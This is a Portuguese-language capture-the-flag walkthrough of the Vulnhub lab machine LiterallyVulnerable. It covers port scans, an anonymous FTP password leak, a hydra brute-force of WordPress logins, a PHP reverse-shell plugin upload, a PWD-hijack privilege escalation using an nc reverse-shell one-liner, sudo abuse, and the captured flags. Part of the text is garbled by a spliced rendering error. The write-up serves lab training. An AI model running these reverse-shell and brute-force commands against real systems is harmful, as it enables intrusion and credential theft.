Vulnhub - LiterallyVulnerable

# Vulnhub - LiterallyVulnerable

## Enumeration

Após ligar a maquina, executado os comandos abaixo para enumeração da VM

```bash
dcruz@kali:/dcruz/fiap/literallyvulnerable$ nmap -p- -sC -sV -Pn -oA quick 172.30.2.216       
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 13:41 -03                               
Nmap scan report for literallyvulnerable.mshome.net (172.30.2.216)                            
Host is up (0.00020s latency).                 
Not shown: 65531 closed ports                  
PORT      STATE SERVICE VERSION                
21/tcp    open  ftp     vsftpd 3.0.3           
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                        
|_-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords                     
| ftp-syst:                                    
|   STAT:                                      
| FTP server status:                           
|      Connected to ::ffff:172.30.3.228        
|      Logged in as ftp                                                                       
|      TYPE: ASCII                             
|      No session bandwidth limit                                                             
|      Session timeout in seconds is 300                                                      
|      Control connection is plain text                                                       
|      Data connections will be plain text     
|      At session startup, client count was 3                                                 
|      vsFTPd 3.0.3 - secure, fast, stable     
|_End of status                                                                               
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)          
| ssh-hostkey:                                                                                
|   2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)                                
|   256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA)                               
|_  256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)                             
80/tcp    open  http    nginx 1.14.0 (Ubuntu)                                                 
|_http-generator: WordPress 5.3                                                                                                                                                             
|_http-server-header: nginx/1.14.0 (Ubuntu)                                                   
|_http-title: Not so Vulnerable &#8211; Just another WordPress site                           
|_http-trane-info: Problem with XML parsing of /evox/about                                    
65535/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                        
|_http-server-header: Apache/2.4.29 (Ubuntu)   
|_http-title: Apache2 Ubuntu Default Page: It works                                           
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds                               
```

Scan todas as portas

```bash
dcruz@kali:/dcruz/fiap/literallyvulnerable$ nmap -A -p- -Pn -oA allPorts 172.30.2.216          
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-29 14:06 -03
Nmap scan report for literallyvulnerable.mshome.net (172.30.2.216)
Host is up (0.00028s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3 not vulnerable
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.30.3.228
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)
|   256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA)
|_  256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)
80/tcp    open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: WordPress 5.3
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Not so Vulnerable &#8211; Just another WordPress site
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
```

Acessando o FTP de forma anonima realizado o download do arquivo backupPasswords, único arquivo existente, o qual possuia algumas senhas em seu conteúdo

- Directory listing do FTP

```bash
   
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Dec 04 13:05 .
drwxr-xr-x    2 ftp      ftp          4096 Dec 04 13:05 ..
-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords
226 Directory send OK.
ftp> exit
221 Goodbye.
```

- Conteúdo do arquivo de texto

```bash
dcruz@kali:/dcruz/fiap/literallyvulnerable/loot$ cat backupPasswords 
Hi Doe, 

I'm guessing you forgot your password again! I've added a bunch of passwords below along with your password so we don't get hacked by those elites again!

*$eGRIf7v38s&p7
yP$*SV09YOrx7mY
GmceC&oOBtbnFCH
3!IZguT2piU8X$c
P&s%F1D4#KDBSeS
$EPid%J2L9LufO5
nD!mb*aHON&76&G
$*Ke7q2ko3tqoZo
SCb$I^gDDqE34fA
Ae%tM0XIWUMsCLp
```

### Enum 80/TCP:

Identificado Wordpress 5.3 em execução, sem plugins ou RCE vuln conhecidas.
- `wpscan --url http://literally.vulnerable -e vp,vt,u`
    - Encontrado uma vulnerabilidade de listar posts protegidos por senha, porem nenhum post alem do default foi retornado
    - Enumerado os users porém encontrado apenas o admin, para o qual as senhas existentes nenhuma teve êxito.
    - Enumerado site com `dirbuster/directory-list-2.3-medium.txt` porem diversos erros 301 estavam sendo retornados. Ao alterar os parametros do dirbuster para excluir o redirect 301 como sucesso, apenas algumas paginas já conhecidas do Wordpress foram retornadas.
    - Executado nikto e nenhum diretório interessante também foi retornado.
        ○ Enum 65535/TCP
        § Identificado pagina default do Apache2
        § Executado gobuster com dirbuster/directory-list-2.3-medium.txt porem nenhum diretório relevante foi encontrado
        § Executado dirbuster com a lista
        § Uma vez que a enumeração com esta lista não houve sucesso e SSH e FTP não são vulneraveis, realizado enumeração novamente com outra lista de diretórios, dirb/big.txt, onde os diretórios abaixo foram retornados:
        /.htpasswd (Status: 403)
        /.htpasswd.php (Status: 403)
        /.htaccess (Status: 403)
        /.htaccess.php (Status: 403)
        /javascript (Status: 301)
        /phpcms (Status: 301)
        /server-status (Status: 403)
        § Ao acessar a pagina /phpcmd, observados dois pontos importantes sobre esta instalação do Wordpress:
        □ Executado enumeração novamente com WPScan (wpscan --url http://literally.vulnerable:65535/phpcms -e vt,vp,u) e encontrado a mesma instalação do wordpress, porem com os users notadmin e maybeadmin
        § Para as contas encontradas, realizado bruteforce utilizando hydra conforme linha de comando abaixo:
        □ hydra -L users -P passwords literally.vulnerable -s 65535 -V http-form-post '/phpcms/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fliterally.vulnerable%3A65535%2Fphpcms%2Fwp-admin%2F&testcookie=1:incorrect'
        □ Found password \[65535\]\[http-post-form\] host: literally.vulnerable login: maybeadmin password: 
        
        $EPid%J2L9LufO5 § Ao acessar com a conta "maybeadmin" foi possível ler o post protegido, uma vez que o usuário "maybeadmin" não possui grandes permissões. No post está contida a senha do user notadmin:Pa$
        
        $w0rd13!& § Com acesso total ao wordpress, tentado incluir um shell reverso/rce na maquina porem o editor não retorna sucesso ao salvar arquivos. A alternativa seria realizar o upload de um novo plugin ou tema para esta finalidade □ Criado um arquivo zip contendo dois arquivos: ® PluginManifest ® Shell (php reverseshell pentest monkey) □ Após upload, navegado no caminho wp-content/plugins/ABC123/XPTO.php (caminho fisico do arquivo no wordpress), onde foi possivel obter um shell. § Após se conectar na maquina, executado LinEnum encontrado um arquivo configurado com SUID § Ao executar este arquivo, o mesmo mostra o PWD. § Ao realizar o hijacking do PWD, executado o comando export para popular o atributo □ export PWD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.30.3.228 4443 >/tmp/f' § Neste novo shell, como John, foi possivel obter o arquivo user.txt john@literallyvulnerable:/home/john$
        
        KaTeX parse error: Expected 'EOF', got '&' at position 8: w0rd13!&̲ § Com acesso t…
        
        cat user.txt
        Almost there! Remember to always check permissions! It might not help you here, but somewhere else! ;)
        Flag: iuz1498ne667ldqmfarfrky9v5ylki
        § Enumerando os arquivos em /home que o usuário tem acesso, encontrado um arquivo chamado myPassword:
        john@literallyvulnerable:/home/john$ find /home -type f -readable 2> /dev/null
        /home/doe/.bash_logout
        /home/doe/.bashrc
        /home/doe/noteFromAdmin
        /home/doe/.profile
        /home/doe/itseasy
        /home/john/.bash_logout
        /home/john/.ssh/authorized_keys
        /home/john/user.txt
        /home/john/.bashrc
        /home/john/.local/share/tmpFiles/myPassword
        /home/john/.profile
        /home/john/.cache/motd.legal-displayed
        § Conteúdo do arquivo myPassword
        john@literallyvulnerable:/home/john$ cat /home/john/.local/share/tmpFiles/myPassword
        I always forget my password, so, saving it here just in case. Also, encoding it with b64 since I don't want my colleagues to hack me!
        am9objpZWlckczhZNDlJQiNaWko=
        § Decodificando a string, encontrado a senha
        □ john:YZW$s8Y49IB#ZZJ
        § Com o usuário e senha encontrados, foi possivel realizar o acesso via SSH com a conta john
        § Com a senha, executado o comando sudo -l foi possivel enumerar os seguintes comandos que a conta pode executar como root:
        □ /var/www/html/test.html
        § Criado como www-data, um bash para gerar um shell reverso e obtido shell root.
        § Output do arquivo /root/root.txt

```bash
cat root.txt 
It was
 _     _ _                 _ _         _   _       _                      _     _      _ 
| |   (_) |               | | |       | | | |     | |                    | |   | |    | |
| |    _| |_ ___ _ __ __ _| | |_   _  | | | |_   _| |_ __   ___ _ __ __ _| |__ | | ___| |
| |   | | __/ _ \ '__/ _` | | | | | | | | | | | | | | '_ \ / _ \ '__/ _` | '_ \| |/ _ \ |
| |___| | ||  __/ | | (_| | | | |_| | \ \_/ / |_| | | | | |  __/ | | (_| | |_) | |  __/_|
\_____/_|\__\___|_|  \__,_|_|_|\__, |  \___/ \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|\___(_)
                                __/ |                                                    
                               |___/                                                     

Congrats, you did it! I hope it was *literally easy* for you! :) 
Flag: pabtejcnqisp6un0sbz0mrb3akaudk

Let me know, if you liked the machine @syed__umar
```

Como Root, executado update da indexação dos arquivos e aberto flag local.txt

```bash
root@literallyvulnerable:/root# cat /home/doe/local.txt 
Congrats, you did it! I hope it was *easy* for you! Keep in mind #EEE is the way to go!
Flag: worjnp1jxh9iefqxrj2fkgdy3kpejp
```
